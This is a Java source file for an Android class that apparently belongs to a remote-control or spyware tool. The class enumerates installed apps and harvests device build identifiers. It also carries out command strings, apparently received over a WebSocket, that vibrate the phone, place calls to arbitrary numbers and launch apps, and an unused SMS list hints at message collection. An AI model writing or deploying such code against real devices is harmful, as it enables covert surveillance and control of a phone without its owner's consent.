package com.android.controller.functionalities;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Vibrator;
import android.util.Log;
import android.widget.ListView;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class DeviceInformationFetcher {
    public final Context context; // Initialize the Context variable
    private final List<String> smsList = new ArrayList<>();
    JSONObject json = new JSONObject();
    JSONObject errorObj = new JSONObject();
    private ListView smsListView;

    public DeviceInformationFetcher(Context context) {
        this.context = context;
    }

    public String getAllApps() throws JSONException {
        try {
            List<ApplicationInfo> appInfo = context.getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
            JSONObject appList = new JSONObject();
            // add all the app name in string list
            for (ApplicationInfo info : appInfo) {
                appList.put(info.processName, info.packageName);
            }
            return appList.toString();
        } catch (Exception e) {
            errorObj.put("Error", e.toString());
            return errorObj.toString();
        }
    }


    public String getBasicDetails() throws JSONException {

        try {
            json.put("for", "DEVICE_DETAILS");
            json.put("Model", Build.MODEL);
            json.put("Device", Build.DEVICE);
            json.put("Display", Build.DISPLAY);
            json.put("Device_id", Build.ID);
            json.put("Board", Build.BOARD);
            json.put("Boot loader", Build.BOOTLOADER);
            json.put("Host", Build.HOST);
            json.put("Brand", Build.BRAND);
            json.put("Manufacturer", Build.MANUFACTURER);
            json.put("Hardware", Build.HARDWARE);
            json.put("Type", Build.TYPE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                json.put("Soc_Model", Build.SOC_MODEL);
            }
            json.put("Tags", Build.TAGS);
            json.put("User", Build.USER);
        } catch (Exception e) {
            errorObj.put("Error", e.toString());
            return errorObj.toString();
        }
        return json.toString();
    }


    public String vibrate(String command) throws JSONException {
        long time;
        try {
            String[] words = getCommands(command);
            try {
                time = Long.parseLong(words[1]) * 100;
            } catch (Exception e) {
                Log.d("WebSocket", e.toString());
                time = 5000;
            }

            Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
            // Check if the device has a vibrator
            if (vibrator != null && vibrator.hasVibrator()) {
                // Vibrate for the specified duration

                vibrator.vibrate(time);
                json.put("ACK", "VIBRATED");
            }
            return json.toString();

        } catch (Exception e) {
            errorObj.put("Error", e.toString());
            return errorObj.toString();
        }
    }

    private String[] getCommands(String command) {
        return command.split(" ");
    }

    public void makePhoneCall(String command) throws JSONException {
        String[] words = getCommands(command);
        String number = words[1];
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel:" + number));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);

    }

    public String openApp(String command) throws JSONException {
        PackageManager packageManager = context.getPackageManager();


        try {
            String[] words = command.split(" ");
            String packageName = words[1];
            // Try to create an intent to launch the specified app
            Intent intent = packageManager.getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                json.put("ACK", "App opened");
            } else {
                errorObj.put("Error", "App not installed");
                return errorObj.toString();
            }
        } catch (Exception e) {
            e.printStackTrace();
            errorObj.put("Error", e.toString());
            return errorObj.toString();
        }
        return null;
    }
}




